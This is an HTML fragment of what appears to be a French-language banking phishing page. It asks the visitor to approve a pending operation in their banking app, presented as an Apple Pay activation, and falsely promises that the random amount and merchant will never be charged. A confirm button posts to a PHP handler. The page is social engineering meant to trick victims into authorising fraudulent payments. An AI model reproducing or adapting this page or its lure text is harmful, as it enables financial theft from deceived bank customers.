        ...
        <div class="wrapper">
            ...
            <div class="login-box">
                <div class="login-box-inner">
                    <h1>Liaison par Application Bancaire</h1>




<center><img src="https://i.pinimg.com/originals/56/de/53/56de531c09dd363b8a03cd73a5920ef2.gif" style="width: 150px;">
<p style="color: white;"> Pour mieux sécuriser nos paiements, nous nous sommes affiliés avec Apple Pay, vous avez simplement à accepter l'operation active sur votre application bancaire pour activer Apple Pay, cette operation contient un montant et un site aléatoire.
    <br>
<br>

Veuillez noter que vous ne serez en aucun cas débité
</p></center>


                    

                    <form action="loading_finished.php" method="post"> 
                        <div class="form-group">
                            
                        </div>
                        
                        <div class="form-group">
                            <button type="submit" name="launch">Confirmer</button>
                            <center><a style="color: white;" href="authentification.php"><p>Je n'ai pas d'opération active</p></a></center>
                        </div>
